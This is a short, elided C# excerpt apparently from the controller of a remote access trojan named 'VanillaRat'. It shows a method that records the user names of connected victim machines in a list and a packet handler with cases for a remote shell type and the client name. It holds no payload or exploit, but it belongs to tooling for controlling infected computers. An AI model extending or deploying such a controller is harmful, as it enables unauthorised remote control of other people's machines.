...
namespace VanillaRat
{
    public partial class Main : Form
    {
        ...
        private void AddUserName(int ConnectionId, string Namec)
        {
            Console.WriteLine(lbConnectedClients.Items[0].SubItems.Count);
            Console.WriteLine("Получено имя");
            for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
            {
                ListViewItem LVI = lbConnectedClients.Items[n];
                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString()))
                    lbConnectedClients.Items[n].SubItems[5].Text = Namec;
        ...
        public void HandleData(int ConnectionId, byte[] RawData)
        {
            ...
            switch (RawData[0])
            {
                ...
                case 18: //Remote Shell Type
                    ...
                    break;
                case 19: //Client NAME
                   // MessageBox.Show(Encoding.ASCII.GetString(ToProcess));
                    AddUserName(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;
            }
        }
